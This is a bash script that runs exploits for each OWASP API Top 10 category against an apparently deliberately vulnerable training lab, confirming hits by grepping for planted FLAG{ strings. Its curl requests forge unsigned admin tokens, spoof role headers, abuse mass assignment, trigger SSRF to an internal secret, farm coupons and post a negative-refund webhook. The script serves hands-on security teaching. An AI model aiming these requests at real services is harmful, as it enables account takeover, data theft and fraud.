#!/usr/bin/env bash
# test-owasp-api-top10.sh
# Runs all 10 OWASP API Security Top 10 exploits against the live lab.
#
# Requirements on Kali: curl, jq (sudo apt install jq if missing)
#
# Usage:
#   ./test-owasp-api-top10.sh
#   LAB_ACCESS_CODE=yourcode ./test-owasp-api-top10.sh   # if the gate is on

set -uo pipefail

BASE="https://cybersecurity-practical-labs.vercel.app"
COOKIES="cookies.txt"

hr() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$1"; }

# --- 0. Unlock the classroom gate, if set -----------------------------------
if [[ -n "${LAB_ACCESS_CODE:-}" ]]; then
  hr "Unlocking access gate"
  curl -s -c "$COOKIES" -X POST "$BASE/api/gate/unlock" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$LAB_ACCESS_CODE\"}" | jq .
else
  : > "$COOKIES"   # empty cookie jar, fine if gate is disabled
fi
CURL="curl -s -b $COOKIES"

# --- 1. Log in as alice ------------------------------------------------------
hr "Login as alice"
LOGIN_RESP=$($CURL -X POST "$BASE/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}')
echo "$LOGIN_RESP" | jq .
TOKEN=$(echo "$LOGIN_RESP" | jq -r .token)

# --- API1: Broken Object Level Authorization --------------------------------
hr "API1 - BOLA: alice reads bob's record (id 2)"
$CURL "$BASE/api/users/2" -H "Authorization: Bearer $TOKEN" | jq .

# --- API2: Broken Authentication --------------------------------------------
hr "API2 - Broken Auth: decode the unsigned token"
echo "$TOKEN" | base64 -d; echo
FORGED=$(echo -n '{"userId":3,"username":"admin","role":"admin"}' | base64)
echo "Forged admin token: $FORGED"

hr "API2 - Broken Auth: username enumeration"
$CURL -X POST "$BASE/api/auth/login" -H "Content-Type: application/json" -d '{"username":"nobody","password":"x"}' | jq .
$CURL -X POST "$BASE/api/auth/login" -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}' | jq .

hr "API2 - Broken Auth: predictable password reset token"
$CURL -X POST "$BASE/api/auth/reset" -H "Content-Type: application/json" -d '{"action":"request","username":"bob"}' | jq .

# --- API3: Broken Object Property Level Authorization -----------------------
hr "API3 - Mass assignment: alice self-promotes to admin"
$CURL -X PUT "$BASE/api/profile/update" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"isAdmin":true,"role":"admin"}' | jq .

# --- API4: Unrestricted Resource Consumption --------------------------------
hr "API4 - Unrestricted resource consumption: bulk order"
$CURL -X POST "$BASE/api/orders/bulk" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"productId":1,"count":6000}' | jq .

# --- API5: Broken Function Level Authorization ------------------------------
hr "API5 - Broken function-level authz: forged X-Role header"
$CURL "$BASE/api/admin/users" -H "X-Role: admin" | jq .

# --- API6: Unrestricted Access to Sensitive Business Flows ------------------
hr "API6 - Business flow abuse: farming STUDENT50 coupon"
for i in 1 2 3 4 5 6; do
  $CURL -X POST "$BASE/api/checkout/process" \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d '{"productId":1,"couponCode":"STUDENT50"}' | jq -c .
done

# --- API7: Server Side Request Forgery --------------------------------------
hr "API7 - SSRF: fetch-avatar reaching internal service"
$CURL "$BASE/api/fetch-avatar?target=/api/internal/secret" | jq .

# --- API8: Security Misconfiguration ----------------------------------------
hr "API8 - Security misconfiguration: debug endpoint"
$CURL "$BASE/api/debug/info" | jq .
hr "API8 - Security misconfiguration: forced crash / stack trace"
$CURL "$BASE/api/debug/info?crash=1" | jq .

# --- API9: Improper Inventory Management ------------------------------------
hr "API9 - Documented API surface (incomplete on purpose)"
$CURL "$BASE/api/docs" | jq .
hr "API9 - Undocumented legacy v1 shadow endpoint"
$CURL "$BASE/api/v1/legacy/users-export" | jq .

# --- API10: Unsafe Consumption of APIs --------------------------------------
hr "API10 - Unsafe consumption: forged partner webhook, negative refund"
$CURL -X POST "$BASE/api/partner/webhook" \
  -H "Content-Type: application/json" \
  -d '{"userId":1,"refundAmount":-99999,"note":"hax"}' | jq .

hr "Done"
echo "Grep the output above for FLAG{ to confirm each exploit fired."
